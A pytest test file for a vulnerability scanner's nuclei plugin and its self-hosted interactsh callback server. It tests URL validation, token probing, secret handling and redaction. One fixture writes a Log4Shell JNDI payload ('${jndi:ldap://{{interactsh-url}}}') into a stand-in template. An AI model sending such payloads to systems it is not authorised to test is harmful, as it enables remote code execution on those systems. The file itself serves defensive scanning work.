"""A self-hosted interactsh server for nuclei's out-of-band templates (G24): never a public
one, the token never on the command line, a server that does not answer means `-ni` and a
note, and a template that got no callback (or ended in an error) is never "not matched"."""

from __future__ import annotations

import json
import shutil
import subprocess
import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest
from test_nuclei_tried import PLAN, assets, line

from zues_scan import redact
from zues_scan.plugins import interactsh, registry
from zues_scan.plugins import nuclei as nuclei_plugin
from zues_scan.plugins.interactsh import Interactsh, InteractshError, server_url
from zues_scan.plugins.nuclei import NucleiPlugin
from zues_scan.plugins.registry import PluginContext, PluginError

TOKEN = "t0ken-of-the-oast-server"


# --- configuration ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("value", "url"),
    [
        ("https://oast.corp.internal", "https://oast.corp.internal"),
        ("http://OAST.Lab.:8080/", "http://oast.lab:8080"),
        ("  https://oast.example.org  ", "https://oast.example.org"),
    ],
)
def test_a_server_of_your_own(value: str, url: str) -> None:
    assert server_url(value) == url


@pytest.mark.parametrize(
    ("value", "error"),
    [
        ("https://oast.fun", "public ProjectDiscovery server"),
        ("https://abc.oast.pro", "public ProjectDiscovery server"),
        ("http://interact.sh", "public ProjectDiscovery server"),
        ("http://10.0.0.53", "not an address"),
        ("http://[fd00::53]", "not an address"),
        ("oast.corp.internal", "must be the server's URL"),
        ("ftp://oast.corp.internal", "must be the server's URL"),
        ("https://oast.corp.internal/x", "no path"),
        ("https://u:p@oast.corp.internal", "no path or user"),
        ("https://oast.corp.internal:99999", "(?i)port"),
    ],
)
def test_what_is_refused(value: str, error: str) -> None:
    with pytest.raises(InteractshError, match=error):
        server_url(value)


def test_from_the_environment() -> None:
    assert interactsh.from_env({}) is None
    server = interactsh.from_env(
        {"ZUES_INTERACTSH_SERVER": "https://oast.lab", "ZUES_INTERACTSH_TOKEN": TOKEN}
    )
    assert server == Interactsh("https://oast.lab", TOKEN)
    assert server.domain == "oast.lab"
    assert TOKEN not in repr(server)  # logs and tracebacks
    with pytest.raises(InteractshError, match="ZUES_INTERACTSH_SERVER is not"):
        interactsh.from_env({"ZUES_INTERACTSH_TOKEN": TOKEN})


def test_the_configuration_file_quotes_what_it_holds() -> None:
    text = Interactsh("https://oast.lab", 'a"b: #c').config()
    assert text == 'interactsh-server: "https://oast.lab"\ninteractsh-token: "a\\"b: #c"\n'
    assert Interactsh("https://oast.lab").config() == 'interactsh-server: "https://oast.lab"\n'


def test_the_registry_reads_the_environment(monkeypatch: pytest.MonkeyPatch) -> None:
    loaded = registry.load(lambda: [])
    (plugin,) = loaded.build(["nuclei"], "check", PluginContext())
    assert plugin.interactsh is None
    monkeypatch.setenv("ZUES_INTERACTSH_SERVER", "https://oast.lab")
    monkeypatch.setenv("ZUES_INTERACTSH_TOKEN", TOKEN)
    (plugin,) = loaded.build(["nuclei"], "check", PluginContext())
    assert plugin.interactsh == Interactsh("https://oast.lab", TOKEN)
    monkeypatch.setenv("ZUES_INTERACTSH_SERVER", "https://oast.live")
    with pytest.raises(PluginError, match="nuclei: oast.live is a public"):
        loaded.build(["nuclei"], "check", PluginContext())


# --- the probe, against a real HTTP server -----------------------------------------------------


class Fake(BaseHTTPRequestHandler):
    """Answers /poll like interactsh-server 1.4.1 does (measured): 401 without the
    right token, 400 for an id nobody registered."""

    token: str | None = TOKEN
    seen: list[tuple[str, str | None]] = []

    def do_GET(self) -> None:  # noqa: N802
        self.seen.append((self.path, self.headers.get("Authorization")))
        if not self.path.startswith("/poll?"):
            self._answer(200, b"<h1> Interactsh Server </h1>")
        elif self.token and self.headers.get("Authorization") != self.token:
            self._answer(401, b"")
        else:
            cause = b'cause=\\"could not get correlation-id from cache\\"'
            self._answer(400, b'{"error":"could not get interactions: ' + cause + b'"}\n')

    def _answer(self, code: int, body: bytes) -> None:
        self.send_response(code)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args: object) -> None:
        pass


@pytest.fixture
def server() -> Iterator[str]:
    Fake.seen = []
    Fake.token = TOKEN
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Fake)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_port}"
    httpd.shutdown()
    httpd.server_close()


def test_the_probe(server: str) -> None:
    assert Interactsh(server, TOKEN).probe() is None
    path, auth = Fake.seen[-1]
    assert path.startswith("/poll?id=") and auth == TOKEN
    assert "refused the token" in (Interactsh(server, "wrong").probe() or "")
    assert "needs a token: set ZUES_INTERACTSH_TOKEN" in (Interactsh(server).probe() or "")
    Fake.token = None
    assert Interactsh(server).probe() is None  # a server without a token


def test_the_probe_tells_a_wrong_server(server: str, tmp_path: Path) -> None:
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), BaseHTTPRequestHandler)  # 501 for GET
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        problem = Interactsh(f"http://127.0.0.1:{httpd.server_port}").probe()
    finally:
        httpd.shutdown()
        httpd.server_close()
    assert "answered HTTP 501: not an interactsh server?" in (problem or "")
    gone = Interactsh(server.rsplit(":", 1)[0] + ":9").probe(timeout=2)
    assert "is not reachable" in (gone or "")


# --- nuclei with a server ---------------------------------------------------------------------


@pytest.fixture
def templates(tmp_path: Path) -> Path:
    root = tmp_path / "templates"
    cves = root / "http" / "cves" / "2021"
    cves.mkdir(parents=True)
    (cves / "CVE-2021-41773.yaml").write_text("id: CVE-2021-41773\nhttp: []\n", encoding="utf-8")
    (cves / "CVE-2021-44228.yaml").write_text(
        "id: CVE-2021-44228\npayload: ${jndi:ldap://{{interactsh-url}}}\n", encoding="utf-8"
    )
    nuclei_plugin._INDEXES.clear()
    return root


class Runs:
    """nuclei's runs, faked: what they were given, and the token file as nuclei saw it."""

    def __init__(self, monkeypatch: pytest.MonkeyPatch, stdout: str) -> None:
        self.commands: list[list[str]] = []
        self.configs: list[str] = []
        self.stdout = stdout
        monkeypatch.setattr(shutil, "which", lambda _name: "/usr/bin/nuclei")
        monkeypatch.setattr(subprocess, "run", self.run)

    def run(self, command: list[str], **kwargs: Any) -> object:
        if "-version" in command:
            return subprocess.CompletedProcess(command, 0, "", "Engine Version: v3.11.1")
        self.commands.append(command)
        if "-config" in command:
            self.configs.append(Path(command[command.index("-config") + 1]).read_text("utf-8"))
        return subprocess.CompletedProcess(command, 0, stdout=self.stdout, stderr="")


def plugin(server: str, templates: Path | None = None) -> NucleiPlugin:
    return NucleiPlugin(
        templates=str(templates) if templates else None, interactsh=Interactsh(server, TOKEN)
    )


def test_the_check_calls_back_to_your_server(
    server: str, monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    runs = Runs(monkeypatch, "")
    result = plugin(server, templates).check(PLAN, assets())

    for command in runs.commands:  # the web run and the network run
        assert "-ni" not in command
        assert command[command.index("-iserver") + 1] == server
        assert command[command.index("-interactions-cooldown-period") + 1] == "15"
        assert TOKEN not in " ".join(command)
    assert runs.configs == [f'interactsh-server: "{server}"\ninteractsh-token: "{TOKEN}"\n'] * 2
    assert not any(Path(c[c.index("-config") + 1]).exists() for c in runs.commands)  # removed
    assert all(TOKEN not in " ".join(raw.command) for raw in result.raw)  # kept as evidence
    assert "out-of-band templates on, callbacks to 127.0.0.1" in result.notes
    assert len([p for p, _ in Fake.seen if p.startswith("/poll")]) == 1  # asked once


def test_a_server_that_does_not_answer_means_no_callbacks(
    server: str, monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    runs = Runs(monkeypatch, line("CVE-2021-44228", templates, status=False) + "\n")
    Fake.token = "another"
    check = plugin(server, templates)
    result = check.check(PLAN, assets())
    assert all("-ni" in c and "-iserver" not in c and "-config" not in c for c in runs.commands)
    assert any(n.startswith("interactsh: ") and "refused the token" in n for n in result.notes)

    wanted = {("10.0.0.5", 8080): {"CVE-2021-44228"}}
    tried = check.verify(PLAN, assets(), wanted)
    assert tried.tried == []  # left out, as without a server
    assert any("need out-of-band callbacks" in n for n in tried.notes)
    assert len([p for p, _ in Fake.seen if p.startswith("/poll")]) == 1  # not asked again


def test_an_out_of_band_template_without_a_callback(
    server: str, monkeypatch: pytest.MonkeyPatch, templates: Path
) -> None:
    runs = Runs(monkeypatch, line("CVE-2021-44228", templates, status=False) + "\n")
    wanted = {("10.0.0.5", 8080): {"CVE-2021-44228"}}
    result = plugin(server, templates).verify(PLAN, assets(), wanted)

    (command,) = runs.commands
    assert command[command.index("-id") + 1] == "CVE-2021-44228"  # run, with callbacks
    (attempt,) = result.tried
    assert attempt.cve == "CVE-2021-44228"
    assert "no out-of-band callback reached 127.0.0.1 within 15s" in attempt.what
    assert "or the target cannot reach that server" in attempt.what


def test_a_callback_confirms(server: str, monkeypatch: pytest.MonkeyPatch, templates: Path) -> None:
    interaction = {
        "protocol": "dns",
        "unique-id": "dc36qv9vfsu2t7704heg6qjb4tkqcs14j",
        "q-type": "A",
        "remote-address": "10.77.0.80",
    }
    out = "\n".join(
        [  # as nuclei 3.11.1 printed it: the first request did not match, the callback did
            line("CVE-2021-44228", templates, status=False),
            line(
                "CVE-2021-44228",
                templates,
                status=True,
                extra={"matched-at": "http://10.0.0.5:8080", "interaction": interaction},
            ),
        ]
    )
    Runs(monkeypatch, out)
    wanted = {("10.0.0.5", 8080): {"CVE-2021-44228"}}
    result = plugin(server, templates).verify(PLAN, assets(), wanted)
    assert result.tried == []
    (finding,) = result.assets[0].findings
    assert finding.cve == "CVE-2021-44228"
    assert finding.evidence.endswith("; out-of-band dns callback from 10.77.0.80")


@pytest.mark.parametrize("with_server", [True, False])
def test_a_run_that_ended_in_an_error_is_not_a_try(
    server: str, monkeypatch: pytest.MonkeyPatch, templates: Path, with_server: bool
) -> None:
    errors = {
        "CVE-2021-44228": "interactsh client not initialized",  # nuclei carries on without
        "CVE-2021-41773": "connection refused",
    }
    if not with_server:
        del errors["CVE-2021-44228"]  # not even run: nuclei prints only what it ran
    out = "\n".join(
        line(cve, templates, status=False, extra={"error": error}) for cve, error in errors.items()
    )
    Runs(monkeypatch, out)
    wanted = {("10.0.0.5", 8080): {"CVE-2021-44228", "CVE-2021-41773"}}
    check = plugin(server, templates) if with_server else NucleiPlugin(templates=str(templates))
    result = check.verify(PLAN, assets(), wanted)
    assert result.tried == []
    (note,) = [n for n in result.notes if "ended in an error" in n]
    assert "1 x connection refused" in note
    assert ("interactsh client not initialized" in note) is with_server  # else: not run


# --- what is kept ------------------------------------------------------------------------------


def test_an_http_callback_is_masked_like_any_exchange() -> None:
    hit = {
        "template-id": "CVE-2099-1",
        "interaction": {
            "protocol": "http",
            "raw-request": (
                "GET /x HTTP/1.1\r\nHost: a.oast.lab\r\nAuthorization: Bearer abc.def\r\n\r\n"
            ),
            "remote-address": "10.0.0.5",
        },
    }
    dns = {"template-id": "CVE-2099-2", "interaction": {"protocol": "dns", "q-type": "A"}}
    kept = redact.nuclei_jsonl(json.dumps(hit) + "\n" + json.dumps(dns) + "\n").splitlines()
    request = json.loads(kept[0])["interaction"]["raw-request"]
    assert "Authorization: Bearer [redacted]" in request and "abc.def" not in request
    assert json.loads(kept[0])["interaction"]["remote-address"] == "10.0.0.5"
    assert kept[1] == json.dumps(dns)  # nothing to mask: byte for byte


def test_zues_doctor_says(server: str) -> None:
    from zues_scan.doctor import ERROR, INFO, OK, WARN, check_interactsh

    named = server.replace("127.0.0.1", "localhost")  # a name: an address is refused
    assert check_interactsh({}).status == INFO
    assert check_interactsh({"ZUES_INTERACTSH_SERVER": "https://oast.fun"}).status == ERROR
    good = check_interactsh({"ZUES_INTERACTSH_SERVER": named, "ZUES_INTERACTSH_TOKEN": TOKEN})
    assert good.status == OK and "with a token" in good.detail and "*.localhost" in good.detail
    bad = check_interactsh({"ZUES_INTERACTSH_SERVER": named, "ZUES_INTERACTSH_TOKEN": "x"})
    assert bad.status == WARN and "refused the token" in bad.detail
